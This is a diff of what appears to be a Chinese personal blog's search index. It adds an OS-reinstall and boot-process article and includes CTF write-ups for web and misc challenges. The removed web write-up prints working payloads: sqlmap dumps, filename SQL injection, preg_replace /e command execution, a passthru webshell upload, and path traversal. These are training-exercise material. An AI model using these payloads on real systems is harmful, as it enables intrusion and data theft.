@@ -34,8 +34,16 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[重装系统及相关知识点]]></title>
+    <url>%2F2020%2F07%2F11%2F%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E5%8F%8A%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%2F</url>
+    <content type="text"><![CDATA[1.iso镜像直接安装在下个OSI镜像后,双击打开安装,在选择期间,可以选择把是否把用户数据删除,不用删除也可以安装,当然你想来个完全全新的系统,可以选择删除数据.,再等电脑重启就好了 2.ghost 安装（美国赛门铁克公司旗下的硬盘备份还原工具）s Ghost系统是指通过赛门铁克公司（Symantec Corporation）出品的Ghost在装好的操作系统中进行镜像克隆的版本，通常GHOST用于操作系统的备份，在系统不能正常启动的时候用来进行恢复的。 Ghost重装是最简单最方便的重装系统方式，几乎所有的电脑门店和维修店和非官方的系统光盘都是基于Ghost进行重装的，Ghost重装具有操作方便，重装速度快，方法简单的优点Ghost重装系统是从网上下载的操作系统GHO镜像，然后使用Ghost工具（一般使用Onekey Ghost）进行重装。这些镜像系统文件XP的一般在600多M，Win7一般在3–4G左右，Win8一般在3–4G左右 3.U盘安装U盘装系统是目 前一个较为方便的重装系统的方法，只需下载U盘启动盘制作工具制作U盘启动盘，然后在进入系统时设置U盘启动即可，制作工具可以到网上下载。1.下载ISO镜像 2.使用UltraISO文件将系统ISO写入U盘.3.在BIOS界面上将U盘调整为第一启动项（也可以用电脑U盘启动热键）。4.插入U盘并重启计算机，会自动进入安装程序的安装界面，按照提示安装即可。 4.PE安装PE，Windows PE Windows Preinstallation Environment，Windows预安装环境，Windows预先安装环境（Microsoft Windows Preinstallation Environment，简称Windows PE或WinPE）是简化版的Windows XP、Windows Server 2003、Windows Vista、Windows 7 、Windows 8和Windows 10。WinPE是以光盘或其他可携设备作媒介。WinPE作用是方便大企业作出工作站和服务器的企划、给“原始设备制造商”（OEM）制造自定义的Windows操作系统、取代MS-DOS的磁片。Windows PE可理解为Windows的LiveCD。 UEFI 新型UEFI，全称“统一的可扩展固件接口”(Unified Extensible Firmware Interface)， 是一种详细描述类型接口的标准。这种接口用于操作系统自动从预启动的操作环境，加载到一种操作系统上。 BIOS即Basic Input/Output System，翻成中文是“基本输入/输出系统”，是一种所谓的“固件”，负责在开机时做硬件启动和检测等工作，并且担任操作系统控制硬件时的中介角色。因为硬件发展迅速，传统式（Legacy）BIOS 成为进步的包袱，现在已发展出最新的UEFI（Unified Extensible Firmware Interface）可扩展固件接口，相比传统 BIOS 的来说，未来将是一个“没有特定 BIOS”的电脑时代。 与legacy BIOS 相比，UEFI最大的几个区别在于： 编码99%都是由C语言完成； 一改之前的中断、硬件端口操作的方法，而采用了Driver/protocol的新方式； 将不支持X86实模式，而直接采用Flat mode（也就是不能用DOS了，现在有些 EFI 或 UEFI 能用是因为做了兼容，但实际上这部分不属于UEFI的定义了）； 输出也不再是单纯的二进制code，改为Removable Binary Drivers； OS启动不再是调用Int19，而是直接利用protocol/device Path； 对于第三方的开发，前者基本上做不到，除非参与BIOS的设计，但是还要受到ROM的大小限制，而后者就便利多了。7.弥补BIOS对新硬件的支持不足的问题。BIOS它是一组固化到计算机内主板上一个ROM芯片上的程序，它保存着计算机最重要的基本输入输出的程序、开机后自检程序和系统自启动程序，它可从CMOS中读写系统设置的具体信息。 其主要功能是为计算机提供最底层的、最直接的硬件设置和控制。此外，BIOS还向作业系统提供一些系统参数。系统硬件的变化是由BIOS隐藏，程序使用BIOS功能而不是直接控制硬件。现代作业系统会忽略BIOS提供的抽象层并直接控制硬件组件。 BIOS芯片中主要存放：●自诊断程序：通过读取CMOSRAM中的内容识别硬件配置，并对其进行自检和初始化；● CMOS设置程序：引导过程中，用特殊热键启动，进行设置后，存入CMOS RAM中；● 系统自举装载程序：在自检成功后将磁盘相对0道0扇区上的引导程序装入内存，让其运行以装入DOS系统；● 主要I/O设备的驱动程序和中断服务：由于BIOS直接和系统硬件资源打交道，因此总是针对某一类型的硬件系统，而各种硬件系统又各有不同，所以存在各种不同种类的BIOS，随着硬件技术的发展，同一种BIOS也先后出现了不同的版本，新版本的BIOS比起老版本来说，功能更强。 GRUB(GRand Unified Bootloader) GNU GRUB 和GRUB是GRand Unified Bootloader的缩写，它是一个多重操作系统启动管理器。用来引导不同系统，如windows，linux。在X86架构的机器中，Linux、BSD 或其它Unix类的操作系统中GRUB、LILO 是大家最为常用，应该说是主流。Windows也有类似的工具NTLOADER；比如我们在机器中安装了Windows 98后，我们再安装一个Windows XP ，在机器启动的会有一个菜单让我们选择进入是进入Windows 98 还是进入Windows XP。NTLOADER就是一个多系统启动引导管理器，NTLOADER 同样也能引导Linux，只是极为麻烦罢了。在PowerPC 架构的机器中，如果安装了Linux的Powerpc 版本，大多是用yaboot 多重引导管理器，比如Apple机用的是IBM PowerPC处理器，所以在如果想在Apple机上，安装Macos 和Linux Powerpc 版本，大多是用yaboot来引导多个操作系统。因为X86架构的机器仍是主流， 所以目前GRUB和LILO 仍然是我们最常用的多重操作系统引导管理器。 引导过程由硬盘启动时，BIOS通常是转向第一块硬盘的第一个扇区，即主引导记录(MBR)。装载GRUB和操作系统的过程，包括以下几个操作步骤： 装载记录基本引导装载程序所做的唯一的事情就是装载第二引导装载程序。 装载Grub这第二引导装载程序实际上是引出更高级的功能，以允许用户装载一个特定的操作系统。 装载系统如linux内核。GRUB把机器的控制权移交给操作系统。不同的是，微软操作系统都是使用一种称为链式装载的引导方法来启动的，主引导记录仅仅是简单地指向操作系统所在分区的第一个扇区。 MBR（Main Boot Record）主引导记录（MBR）是位于磁盘最前边的一段引导（Loader）代码。它负责磁盘操作系统(DOS)对磁盘进行读写时分区合法性的判别、分区引导信息的定位，它由磁盘操作系统(DOS)在对硬盘进行初始化时产生的。通常，我们将包含MBR引导代码的扇区称为主引导扇区。因这一扇区中，引导代码占有绝大部分的空间，故而将习惯将该扇区称为MBR扇区（简称MBR）。由于这一扇区承担有不同于磁盘上其他普通存储空间的特殊管理职能，作为管理整个磁盘空间的一个特殊空间，它不属于磁盘上的任何分区，因而分区空间内的格式化命令不能清除主引导记录的任何信息。 MBR结构图主引导扇区由三个部分组成(共占用512个字节)：1.主引导程序即主引导记录（MBR）（占446个字节）可在FDISK程序中找到，它用于硬盘启动时将系统控制转给用户指定的并在分区表中登记了的某个操作系统。2.磁盘分区表项（DPT，Disk Partition Table)由四个分区表项构成（每个16个字节）。负责说明磁盘上的分区情况，其内容由磁盘介质及用户在使用FDISK定义分区时决定。（具体内容略）3.结束标志（占2个字节）其值为AA55，存储时低位在前，高位在后，即看上去是55AA（十六进制）。]]></content>
+      <tags>
+        <tag>计算机应用</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[树莓派安装kali2020教程和坑点]]></title>
-    <url>%2F2020%2F07%2F05%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85kali2020%E6%95%99%E7%A8%8B%E5%92%8C%E5%9D%91%E7%82%B9%2F</url>
+    <url>%2F2020%2F07%2F11%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85kali2020%E6%95%99%E7%A8%8B%E5%92%8C%E5%9D%91%E7%82%B9%2F</url>
     <content type="text"><![CDATA[1.下载刻录系统镜像到https://www.offensive-security.com/kali-linux-arm-images/下载镜像。选择自己的对应的型号。需要注意的是这是国外的地址，自备梯子，用种子下比较快一点。选择Win32DiskImager这款软件把系统刻录进sd卡，点击写入，等待写入就完成了，sd卡便写入了系统。 2.树莓派装机我是买带风扇的小机箱装好机子后,我把内存卡插进去后，系统没反应，显示器显示的是黑屏，通过网线把树莓派和路由器连接，也没有在路由器后台发现新增的ip，树莓派看了启动失败啊，在我通过一步步排查后，发现是我的风扇排线插错了，囧。但这插线位置也太奇葩了吧，正确的风扇插线还是看图吧。 排线插对果然可以正常开机了，显示屏也亮起来了 3.关于树莓派kali2020进去系统后，发现用之前的root/toor登录系统失败，原来是官方改了默认密码了，新的账号密码为kali/kali，不能用root登录了，进去之后我想用ifconfig、service等命令查看系统信息的，擦，提示没有这个命令，我就想arm系统的kali阉割了这么多东西嘛，然后我用sudo ifconfig就可以了，老版的kali用习惯了。默认root账号密码就不知道了，不过可以修改root密码用sudo passwd root进行修改就行了。]]></content>
       <categories>
         <category>kali</category>
@@ -45,19 +53,8 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[攻防世界web 高手区部分Writeup]]></title>
-    <url>%2F2020%2F04%2F05%2F%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%20%E9%83%A8%E5%88%86wp%2F</url>
-    <content type="text"><![CDATA[攻防世界web高手区1.ics-06url中id=1，进行爆破，到2333，出现flag Flag:cyberpeace{4468f3e51629f05830259d073f03dbd6} 2. NewsCenter ——sql注入sql注入post型，sqlmap自动化注入，sqlmap.py -r “post.txt” –dbs -D news -T secret_table –dump flag:QCTF{sq1_inJec7ion_ezzz} 3. Mfw ——.git路径信息泄漏进行目录扫描，发现。.git目录泄漏 GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。 flag.php源文件看不所以来，去index.php看一下进行代码审计 $file = “templates/“ . $page . “.php”;page这个变量是直接从GET参数中获取的，没有进行任何处理，那么也就意味着我们输入的任何东西就能够在不被验证的情况下执行。那么，我们可以在这个位置放置system函数。这样，由于后面的assert函数，system函数就成功得以运行并输出结果。 构建$file变量：$file = “templates/“ . ‘.system(“ pwd ;”).’ . “.php”; flag.php不存在，使用git diff比较工作区与暂存区的差异 4. NaNNaNNaNNaN-Batman下载下来的压缩包解压，得到一个web100的文本，查看是乱码，但还是可以看出是js代码，把文件类型改为html，在浏览器打开 把eval（）函数改成alert()函数，弹窗可以得到源代码了 js function $() { var e = document.getElementById(‘c’).value; if (e.length == 16) { if (e.match(/^be0f23/) != null) { if (e.match(/233ac/) != null) { if (e.match(/e98aa$/) != null) { if (e.match(/c7be9/) != null) { var t = [‘fl’, ‘s_a’, ‘i’, ‘e}’]; var n = [‘a’, ‘_h0l’, ‘n’]; var r = [‘g{‘, ‘e’, ‘0’]; var i = [‘it\’’, ‘‘, ‘n’]; var s = [t, n, r, i]; for (var o = 0; o &lt; 13; ++o) { document.write(s[o % 4][0]); s[o % 4].splice(0, 1); } } } } } } } document.write(‘Ok‘); delete _; 根据分析是正则表达式 be0f233ac7be98aa。 把它输入文本框，得到flag值， 5. Upload —————文件名注入用常规的文件上传方式失败无果，且无法得到上传文件放置的目录 文件名称注入,使用select,from,发现被过滤，内嵌select绕过过滤，使用CONV,substr,hex 函数，CONV函数将16进制转化为10进制，依次获取子串的12位，用substr截取12是因为一旦过长，会用科学计数法表示。 返回回显数字131277325825392转化为字符串为web_up即为部分库名， 文件名’+(selselectect CONV(substr(hex(dAtaBase()),13,12),16,10))+’.jpg让其显示库名的后部分 1819238756转化二进制转化字符串即为load，合并前一部分数据库名为web_upload 文件名 ‘+(seleselectct+CONV(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema=’web_upload’ limit 1,1)),1,12),16,10))+’.jpg 转换为字符串为：hello_ 文件名’+(seleselectct+CONV(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema=’web_upload’ limit 1,1)),13,12),16,10))+’.jpg 得到回显为：112615676665705转化字符串flag_i 继续探测表名， 文件名’+(seleselectct+CONV(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema=’web_upload’ limit 1,1)),25,12),16,10))+’.jpg 得到回显：126853610566245转化字符串：s_here 最终得到表名为：hello_flag_is_here 得到表名继续探测列名构建sql注入语句 文件名’+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = ‘hello_flag_is_here’ limit 0,1)),1,12),16,10))+’.jpg 得到回显为：115858377367398转化为字符串i_am_f 文件名’+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = ‘hello_flag_is_here’ limit 0,1)),13,12),16,10))+’.jpg 得到回显为7102823转化字符串lag。 所以列名为i_am_flag 导出列名得值构建sql语句 文件名’+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+’.jpg 得到回显为：36427215695199 转化字符串为!!_@m_ 继续构造sql函数 文件名’+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+’.jpg 得到回显为：92806431727430 转化字符串为Th.e_F 文件名’+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+’.jpg 得到回显560750951 转化为!lag 拼接完成为!!_@m_ Th.e_F!lag即为flag值 6. PHP2进行目录扫描，发现index.php的备份文件index.php2, 访问index.php2文件查看源代码，根据代码要使登录成功必须满足两个条件，第一步，要使得”admin”===$_GET[id]不成立 第二步，经过$_GET[id] = urldecode($_GET[id]);，使得$_GET[id] == “admin”成立。 ?id=%2561dmin urldecode/urlencode 当传入参数id时，浏览器在后面会对非ASCII码的字符进行一次urlencode 然后在这段代码中运行时，会自动进行一次urldecode 在urldecode()函数中，再一次进行一次解码 urldecode(%2561)=%61 urldecode(%61)=a 7. unserialize3 ——php反序列化打开网页后是一段php代码，对其进行审计，进行序列化 然后通过_wakeup()执行漏洞（一个字符串或对象被序列化后，如果其属性被修改，则不会执行wakeup()函数）来绕过这个wakeup函数。我们把序列码修改其属性1为2后，输入url中，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup的执行 8. Cat ——命令注入看到题目尝试ping下可通，用命令连接符连接命令，ls，echo，cat等命令发现无果 url中可接受url编码，%80特殊ascii码符号，url编码使用的是16进制，80也就是128，ASCII码是从0-127，使其产生报错，根据报错信息可得知是基于python环境django web框架，根据框架得信息和框架结构，使用php curl，@ 访问配置文件@/opt/api/api/settings.py，搜索关键词database，等到数据库的信息 访问@/opt/api/database.sqlite3，搜索关键字ctf，得到flag值 9. ics-04——sql post注入 首先先尝试一下登录，注册一个名为admin的账号，登录后，告诉我是普通用户，无效 点击一下忘记密码，看看有没有其他出路 修改的还是admin普通账户，现在我开启burp进行拦包，看有没有越权操作，好像有没有什么可以操作的，到时揽到一个post的包，sqlmap跑一下再说 跑出来了，密码进行md5解密，为1qazWSXED56yhn8ujm9olk81wdfTG，去登陆，成功，取得flag 10.Isc-05 进入指定页面发现平白无奇，查看源代码，发现传参page，在url尝试一波，试了一下不是命令执行，而是php伪协议的文件包含 Php伪协议base64读取index.php源代码。 把转化明文，从源代码中可以看出要求X_FORWARDED_FOR为127.0.0.1，并且有3个get方式可传参数，pat、rep、sub 构造url：/index.php?pat=/(.*)/e&amp;rep=system(‘ls’)&amp;sub=aa 如图 ?pat=/(.*)/e&amp;rep=system(‘ls+s3chahahaDir’)&amp;sub=aa 查看s3chahahaDir文件夹 ?pat=/(.*)/e&amp;rep=system(‘ls+s3chahahaDir/flag’)&amp;sub=aa 查看flag文件夹，发现flag.php文件 /index.php?pat=/(.*)/e&amp;rep=system(‘cat+s3chahahaDir/flag/flag.php’)&amp;sub=aa 查看flag， 在查看页面源代码中可以看到flag值 11.BUG开局就注册和登陆的界面 先任意注册一个用户，登陆后发现cookie user值是md5加密的，发现cookie值得组成方式是”uid:用户名”的形式组成的，可得到admin用户的cookie未加密时为”1:admin” 修改user为admin加密的md5值，刷新发现home模块还是显示abc用户，并且menge模块不可看 点击persional，修改url的uid为1，就可以admin的个人信息 退出登陆，然后去找回密码的功能模块，根据得到个人信息修改密码 修改完密码后进行登陆，点击Manager模块，报IP错误，修改ip为X-Forwarded-For: 127.0.0.1，成功，后查看源代码有传参可以传，”?module=filemanage&amp;do=???”尝试之后？？？为upload 上传一个php文件，为了绕过进行里php语言的特殊写法如图，进行绕过处理mime改为image/png,文件名为:php4,上传成功，回宣得到flag值 12.wtf.sh-150进入后发现是一个论坛网站，有登录注册，帖子，任意点击一个帖子，发现url中有可测试的尝试，尝试一波发现有文件包含漏洞，可以爆出源代码，将源代码格式化一下方便阅读 从源代码中可以看到存在user目录，且admin登录可以得到flag，遍历进入users目录后好像可以看到类似admin账号cookie 注册一个账户，登录后修改相关的cookie值，刷新后登录为admin账户 点击profile标签，在网页末尾可以看到flag值，但这只是flag值前一部分 13.i-got-id-200初始界面是这样的，点进files，是一个文件上传界面，url中页面文件格式是.pl,可知是perl语言编写的，通过多次上传图片文件，文本格式文件，发现都会输出成文本， 由此猜测是这样的编程格式 param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。 ARGV是PERL默认用来接收参数的数组,不管脚本里有没有把它写出来,它始终是存在的。 所以在上传文件进行拦包改包，添加avgv参数，通过测试发现成功 猜测目录下可能存在flag文件成功读取flag值 14.ics-07打开进去指定页面url个page参数，并且下方可以查看源代码 源代码中可以看出要绕过id 绕过要注意的三个点为： （1）floatval（$ _ GET [id]）！==’1’ //浮点不为1 （2）substr（$ _ GET [id]，-1）===’9‘ //id最后一位为9 （3）Mysql查询结果限制，id不能过大， 构建exp ?page=&amp;id=1/9&amp;submit=提交查询#，可得到admin， 再根据源代码审计，post方式提交一个文件，真实的上传路径是uploaded， 进行文件过滤，要注意的三个点为： （1）$filename = “backup/“.$file; //目录为假目录，传入file时，加上一个../ （2）’/.+.ph(p[3457]?|t|tml)$/i’ //正则过滤文件只匹配最后一个点的后缀，可以写入两次.php （3）真实上传目录为upload 构建exp为file=../123.php/1.php/..&amp;con=&lt;?php passthru($_GET[bash]);?&gt;,用post方式进行传递 访问:http://111.198.29.45:55105/uploaded/123.php?bash=cat%20../flag.php 查看源代码得到flag值 15.Web2点进去后发现是解密的题 审计后我们先解密$_变量 a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws str_rot13 — 对字符串执行 ROT13 转换 =》rot13解密 n1mYotDfPRFRVdEYjhDNlZjYld2Y5IjOkdTN3EDNlhzM0gzZiFTZ2MjO4gjf strrev — 反转字符串 =》fjg4OjM2ZTFiZzg0MzhlNDE3NTdkOjI5Y2dlYjZlNDhjYEdVRFRPfDtoYm1n base64解码=》~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg 由此构建php文件 这里需要翻转一下$_变量 解析php文件得到flag值 16.Website是一个是登录页面，首先扫一下目录，扫出一个test.php页面，base64的值解密出来是乱码， 返回注册一个用户，并登录， 登录后，好像普通用户无法等到flag值，查看cookie值并尝试修改cookie值为刚才的base64,刷新后发现是admin账户了，并且等到flag值 17.Zhuanxv——javaweb HQL注入 整一个静态界面，源码也找不出什么，目录扫描烧到list目录进入后到登录界面 在github找到Zhuanxv application的项目，https://github.com/Lazyboxx/zhuanxvapplication 用初始账号密码登录失败，爆破一下密码，密码是：6yhn7ujm 登录进去发现没有利用的点，查看登录界面的源代码，进行审计发现有一个可疑的参数，进行文件包含下载 在从github项目committed的历史记录中可以知道使用maven框架搭建的web 因为使用javaweb的maven框架，有通用的目录结构 http://111.198.29.45:37888/loadimage?fileName=../../WEB-INF/web.xml 下载web.xml WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[攻防世界misc高手区 Wiretup]]></title>
-    <url>%2F2020%2F03%2F23%2F%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%83%A8%E5%88%86misc%E9%AB%98%E6%89%8B%E5%8C%BA%E9%A2%98%2F</url>
+    <url>%2F2020%2F07%2F11%2F%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%83%A8%E5%88%86misc%E9%AB%98%E6%89%8B%E5%8C%BA%E9%A2%98%2F</url>
     <content type="text"><![CDATA[1.easycap下载下来是一个流量包，用wireshark打开，搜索关键字flag，第二行追踪tcp流， 2.Avatar下载下来是一张图片，这里考察outguess算法，在kali下载outguess，apt-get install outguess, “We should blow up the bridge at midnight”即为flag。 3.What-is-this下载个解压包，解压后是两张图片，用stegsolve打开其中一张，用image combiner进行xor运算，AZADI TOWER即为flag 4.Get-the-key.txt下载来一个解压包，解压后的文件不知道是什么，用file命令查看一下，是磁盘文件，那就先挂载下 下载后有一大堆乱七八糟，用grep命令查找关键字“key.txt”，在1文件，cat查看是乱码，file查看是什么文件，是压缩文件，gunzip查看flag 5.签到题将Z2dRQGdRMWZxaDBvaHRqcHRfc3d7Z2ZoZ3MjfQ==base64转码为ggQ@gQ1fqh0ohtjpt_sw{gfhgs&amp;#35;35;},是凯撒+栅栏，解题关键是flag格式ssctf{}，所以先凯撒得到 ssC@sC1rct0atfvbf_ei{srtse#35;}栅栏得到ssctf{ssCtf_seC10ver#35;@rabit} 6.Training-Stegano-1下载是一张图片，记事本打开，文本显示”passwd:steganoI”,flag即为steganoI 7.Test-flag-please-ignore将666c61677b68656c6c6f5f776f726c647d转换为16进制字符串flag{hello_world} 8.Excaliflag下载图片后，用stegSolve打开图片 9.glance-50下载来是一张gif图片，分解gif，使用convert命令分解，convert 33e3d14fb67a44f4ad1378149fff1d9a.gif flag.png共分解出200张图片 连接这些图片，使用montage 命令，montage flag*.png -tile x1 -geometry +0+0 flag.png -tile是拼接时每行和每列的图片数，这里用x1，就是只一行 -geometry是首选每个图和边框尺寸，我们边框为0，图照原始尺寸即可 这里参考了：https://blog.csdn.net/zz_Caleb/article/details/89490494 10.4-2下载后是一个txt文件，里面是不知道是什么，到这个网站https://quipqiup.com/进行词频分析，flag即为flag{classical-cipher_is_not_security_hs} 11.misc1 猜测16进制转换字符串，直接转失败转不出来，flag为DDCTF{9af3c9d377b61d269b11337f330c935f} string=&quot;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd&quot; flag=&quot;&quot; for i in range (0,len(string),2): s = &quot;0x&quot; + string[i] + string[i+1] flag += chr(int(s,16) -128) print(flag) 12.eczmbarrass下载压缩包解压后是一个流量包，用wireshark打开，搜索关键词flag后，追踪tcp流，在里面搜索flag，可以看到flag 13.肥宅快乐题下载后是一个swf文件，是一个游戏，用potplayer打开定位57帧，出现对话里面有U1lDe0YzaVpoYWlfa3U0aWxlX1QxMTF9，base64解码后为SYC{F3iZhai_ku4ile_T111}，即为flag 14.小小的PDF下载后是pdf文件，用binwalk分析，有点东西，用foremost分解东西，flag藏在分解的图片里 15.Cephalopod下载后是一个流量包，用wireshark打开，flag关键字找到flag.png，但是却弄不出来图片。用binwalk看一下有点东西，foremost搞不出来图片 了解到有tcpxtract这个工具，Tcpxtract是一种基于文件签名从网络流量中提取文件的工具。安装tcpxtract，并使用分离图片出来，flag值出来了 16.hit-the-core下载后是.core文件，.core文件是Linux的文件，用strings命令查看，看到一段特殊的文段 17.pure_color下载后是一张图片，用stegsolve打开调试几下，即可看到flag 18.2-1下载后是一张png图片，打开错误，用winhex打开，发现png文件头错误进行修正后发现还是打不开。 这里涉及了png文件格式 （固定）八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头 （固定）四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13 （固定）四个字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示（IDCH） （可变）13位数据块（IHDR) 前四个字节代表该图片的宽 后四个字节代表该图片的高 后五个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method （可变）剩余四字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行crc计算得到。 使用tweakpng这个工具计算crc校验码 使用脚本跑出正确的宽709，在windex修改成十六进制为02c5。 19.Janos-the-Ripper下载压缩吧解压后不知道是什么文件，用file命令查看下是zip文件，改文件后缀名zip，解压需要密码，进行密码爆破为flag，flag为flag{ev3n::y0u::bru7us?!} 20.2017_Dating_in_Singapore题目为新加坡2017日历，附件解压打开时一张2017新加坡的日历，根据给出的数字进行连线，可得flag 21神奇的Modbus下载下来是一个流量包，用wireshark打开，搜索关键字flag，追踪数据流，这里搜索关键字没用，全部查看下来发现这里有flag，flag为sctf{Easy_Modbus}，要多加一个o 22.4-1下载下来是一张图片，用binwalk查看一下，有点东西，foremost分离出来两张图片，用盲水印攻击，加密脚本：https://github.com/chishaxie/BlindWaterMark 23.can_has_stdio?下载解压包解压得文件用记事本打开，看到得,+,-,.,[,]等符号组成得五角星，可以猜测是Brainfuck语言了， 到https://www.splitbrain.org/services/ook这个网站翻译Brainfuck为文本 24.5-1考察xortool工具的使用，安装python库pip2 install xortool,猜测最有可能得密钥长度为13， xortool cd2a80e1b48e44b5a830605e684ffb31 -l 13 -c 20 //-l 指定密钥长度 -表示出现频率最高的字符。 使用脚本解密出原文，flag为wdflag{You Are Very Smart} 25.MISCal下载解压后不知道是什么文件，用file命令查看一下，是bzip2文件，修改文件后缀名为.bz2,解压文件 发现是git目录，里面有个flag.txt文件不过flag值.git log查看git日志，git stash list列出所有保存的进度列表，git stash apply恢复暂缓区的内容，有s.py文件，运行一下可以得到flag 26.3-1下载下来是rar压缩包，不过文件没有文件后缀名，binwalk查看得rar，添加.rar文件后缀名，提取压缩包出来时一个流量包，用wireshark打开，搜索flag关键字，追踪数据流，在第6个流可以看到flag.rar,base64编码 导出对象，选择http，flag.rar文件，解压需要密码，可以从数据流中可以看解密脚本多半时压缩包密码 提取出来整合修改下 # coding:utf-8 from Crypto import Random from Crypto.Cipher import AES import sys import base64 IV = &#39;QWERTYUIOPASDFGH&#39; def decrypt(encrypted): aes = AES.new(IV, AES.MODE_CBC, IV) return aes.decrypt(encrypted) def encrypt(message): length = 16 count = len(message) padding = length - (count % length) message = message + &#39;\0&#39; * padding aes = AES.new(IV, AES.MODE_CBC, IV) return aes.encrypt(message) str = &#39;19aaFYsQQKr+hVX6hl2smAUQ5a767TsULEUebWSajEo=&#39; example = decrypt(base64.b64decode(str)) print example print decrypt(example) 脚本运行一下，打开flag.txt即可看到flag 27.适合作为桌面下载压缩包解压是一张图片，放stegsolve弄一下，可以看到一个二维码，扫一下可以看到一串数字 这是一串十六进制的数字，在winhex里创建一份文件，把这些数字写进去，保存为.pyc 到https://tool.lu/pyc/这个网站解密pyc文件，解密出来python脚本跑一下即为flag 28.Banmabanma下载下来是一张斑马的图片，猜测是条形码 到https://online-barcode-reader.inliteresearch.com/解码一下，都不用ps一下了，nb 29.simple_transfer下载下来是个流量包，binwalk有点东西，foremost分离出来个pdf，打开pdf即可看到flag 30.warmup下载下来是一张图片和一个加密的zip包，加密的zip也有一个open_forum.png的文件，把open_forum.png压缩用ARCHPR明文进行攻击，破解出加密的zip包，这里要注意压缩软件要使用winrar 解压出来的是两张一样的图，猜测是盲水印，这里使用https://github.com/chishaxie/BlindWaterMark解盲水印的脚本跑出水印的图片即为flag 31.我们的秘密是绿色的下载下来是张日历图片，这里根据题目名字提示，我们要用到Our secret文件隐藏加密软件，密码即是日历图中绿色数字0405111218192526， 可以得到try压缩包，用记事本打开可以看到有生日提示，那就用生日当作密码进行暴力破解，密码最长8位 有破解的密码解压还是一个带加密的zip包，不过zip也有一个readme.txt，明文攻击走起，得到密码Y29mZmVl 解压后又一个加密压缩包，爆破无解，用winhex打开看看，看到伪加密了，把01改成00，解压就不需要密码了 解压后得到一个flag.txt文本，内容为qddpqwnpcplen%prqwn_{_zz*d@gq}，猜测栅栏密码，再凯撒密码 32.Just-No-One下载下来后是一个.exe程序，安装后提醒flag值再安装许可协议，所以找吧，flag即为ILOVEREADINGEULAS 33.Erik-Baleog-and-Olaf下载下来是一张图片，用winhex打开看看，可以看到一个图片网址，http://i.imgur.com/22kUrzm.png 到这个网址把图片下载下来，（需要fq）再对比两张图片，这里我用到的软件是beyond compare,可以看到二维码 34.Py-Py-Py35.Reverse-it下载下来一个不知道是什么文件，binwalk也看不出来，放进winhex看一下，可以文件末尾数字反转过过来就是jpg的文件头FFD8FF 。再结合题目名字，把所有的数字反转过来，winhex新建一个文件，保存jpg 格式 新文件图片如下，有点难看哈，拿一个镜子对着图片照，就容易看了，flag为：SECCON{6in_tex7} 36.mysql下载出来一个压缩包，再解压后的所有文件内容搜索关键字flag，再ib_logfile0文件找到flag， 37.443338.443340.心仪的公司下载解压时一个流量包，追踪http流可以看到flag，有点难找啊 42.很普通的数独]]></content>
       <categories>
         <category>ctf</category>
@@ -67,118 +64,8 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[php学习笔记]]></title>
-    <url>%2F2019%2F12%2F26%2Fphp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
